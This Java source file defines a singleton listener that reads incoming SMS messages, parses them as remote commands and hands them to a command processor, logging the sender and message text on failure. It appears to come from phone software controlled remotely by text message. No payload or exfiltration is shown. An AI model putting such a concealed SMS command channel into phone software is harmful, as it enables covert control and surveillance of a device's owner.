package com.vvt.rmtcmd;

import com.vvt.global.Global;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.smsutil.SMSReceiverListener;
import com.vvt.std.Log;

public class SMSCmdReceiver implements SMSReceiverListener {
	
	private static SMSCmdReceiver self = null;
	private RmtCmdRegister rmtCmdRegister = Global.getRmtCmdRegister();
	private RmtCmdProcessingManager rmtCmdMgr = Global.getRmtCmdProcessingManager();
	private boolean enabled = false;
	
	private SMSCmdReceiver() {
	}
	
	public static SMSCmdReceiver getInstance() {
		if (self == null) {
			self = new SMSCmdReceiver();
		}
		return self;
	}
	
	public void start() {
		if (!enabled) {
			Global.getSMSMessageMonitor().addSMSReceiverListener(this);
			enabled = true;
		}
	}
	
	public void stop() {
		if (enabled) {
			Global.getSMSMessageMonitor().removeSMSReceiverListener(this);
			enabled = false;
		}
	}

	// SMSReceiverListener
	public void onSMSReceived(FxSMSMessage smsMessage) {
		RmtCmdLine rmtCmdLines = rmtCmdRegister.parseRmtCmdLine(smsMessage);
		if (rmtCmdLines != null) {
			rmtCmdMgr.process(rmtCmdLines);
		}
	}

	public void onSMSReceivedFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("SMSCmdReceiver.onSMSReceivedFailed", "SMS Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Message = " + message, e);
	}
}
